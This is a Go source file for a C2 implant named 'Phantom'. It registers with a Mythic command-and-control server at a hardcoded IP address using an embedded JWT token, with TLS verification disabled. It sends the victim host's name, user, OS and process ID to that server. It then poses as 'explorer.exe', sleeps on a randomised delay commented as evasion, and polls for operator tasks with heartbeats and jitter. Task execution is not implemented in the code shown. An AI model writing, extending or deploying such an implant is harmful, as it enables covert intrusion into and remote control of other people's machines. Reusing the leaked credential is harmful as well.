package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

const (
	mythicURL   = "https://37.27.249.191:7443/graphql/"
	jwtToken    = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"
	payloadUUID = "9df7dfc4-f21d-4b03-9962-9f3272669b85"
)

type GraphQLRequest struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
	Data   map[string]interface{} `json:"data"`
	Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
	Message string `json:"message"`
}

func logEvent(message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logMsg := fmt.Sprintf("[%s] %s", timestamp, message)
	fmt.Println(logMsg)
	
	file, err := os.OpenFile("phantom_working.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err == nil {
		file.WriteString(logMsg + "\n")
		file.Close()
	}
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
	payload := GraphQLRequest{
		Query:     query,
		Variables: variables,
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+jwtToken)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	logEvent(fmt.Sprintf("GraphQL Response: %s", string(body)))
	
	var graphqlResp GraphQLResponse
	err = json.Unmarshal(body, &graphqlResp)
	if err != nil {
		return nil, err
	}
	
	return &graphqlResp, nil
}

func registerWithMythic() error {
	logEvent("Registering callback with valid payload UUID...")
	
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "system"
	if currentUser != nil {
		username = currentUser.Username
	}
	
	pid := os.Getpid()
	
	query := `
	mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
		createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
			status
			error
		}
	}`
	
	variables := map[string]interface{}{
		"newCallback": map[string]interface{}{
			"ip":          "127.0.0.1",
			"host":        hostname,
			"user":        username,
			"description": "Phantom C2 Agent - Production Ready",
			"domain":      "",
			"externalIp":  "127.0.0.1",
			"extraInfo":   fmt.Sprintf("OS:%s ARCH:%s PID:%d", runtime.GOOS, runtime.GOARCH, pid),
			"processName": "explorer.exe",
			"sleepInfo":   "5s",
		},
		"payloadUuid": payloadUUID,
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return fmt.Errorf("GraphQL request failed: %v", err)
	}
	
	if len(resp.Errors) > 0 {
		return fmt.Errorf("GraphQL errors: %v", resp.Errors)
	}
	
	if data, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
		status := data["status"].(string)
		if status == "success" {
			logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
			logEvent("Target should now appear in Mythic dashboard")
			return nil
		} else {
			errorMsg := data["error"].(string)
			if strings.Contains(errorMsg, "no rows") {
				return fmt.Errorf("Payload UUID still invalid: %s", errorMsg)
			}
			logEvent(fmt.Sprintf("Registration status: %s", status))
			logEvent(fmt.Sprintf("Registration message: %s", errorMsg))
			return nil // Non-critical error, continue
		}
	}
	
	return fmt.Errorf("Unexpected response format")
}

func checkForTasks() error {
	hostname, _ := os.Hostname()
	agentID := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	query := `
	query getCallbackTasks($agent_callback_id: String!) {
		callback(where: {agent_callback_id: {_eq: $agent_callback_id}}) {
			id
			agent_callback_id
			tasks(where: {status: {_eq: "submitted"}}) {
				id
				command_name
				params
				status
			}
		}
	}`
	
	variables := map[string]interface{}{
		"agent_callback_id": agentID,
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return err
	}
	
	if len(resp.Errors) > 0 {
		logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
	} else {
		logEvent("Checking for new tasks...")
	}
	
	return nil
}

func sendHeartbeat() error {
	hostname, _ := os.Hostname()
	
	query := `
	mutation {
		updateCallback(input: {
			agent_callback_id: "` + fmt.Sprintf("phantom-%s", hostname) + `",
			last_checkin: "` + time.Now().Format(time.RFC3339) + `"
		}) {
			status
		}
	}`
	
	resp, err := makeGraphQLRequest(query, map[string]interface{}{})
	if err == nil && len(resp.Errors) == 0 {
		logEvent("Heartbeat sent")
	}
	
	return nil
}

func main() {
	logEvent("=== PHANTOM MYTHIC AGENT - FINAL VERSION ===")
	logEvent(fmt.Sprintf("Running on: %s %s", runtime.GOOS, runtime.GOARCH))
	logEvent(fmt.Sprintf("Process ID: %d", os.Getpid()))
	logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
	logEvent(fmt.Sprintf("Using Payload UUID: %s", payloadUUID))
	
	// Initial delay for evasion
	delay := 3 + (time.Now().Unix() % 7)
	logEvent(fmt.Sprintf("Initial delay: %ds", delay))
	time.Sleep(time.Duration(delay) * time.Second)
	
	// Register with Mythic
	err := registerWithMythic()
	if err != nil {
		logEvent(fmt.Sprintf("Registration failed: %v", err))
		return
	}
	
	logEvent("Starting main communication loop...")
	
	// Main loop - check for tasks and send heartbeats
	for i := 1; i <= 20; i++ {
		logEvent(fmt.Sprintf("Loop iteration %d", i))
		
		// Check for tasks
		err := checkForTasks()
		if err != nil {
			logEvent(fmt.Sprintf("Task check error: %v", err))
		}
		
		// Send heartbeat every 5 iterations
		if i%5 == 0 {
			sendHeartbeat()
		}
		
		// Sleep with jitter
		sleepTime := 5 + (time.Now().Unix() % 3)
		logEvent(fmt.Sprintf("Sleeping for: %ds", sleepTime))
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
	
	logEvent("Agent execution completed - check Mythic dashboard for registered target")
}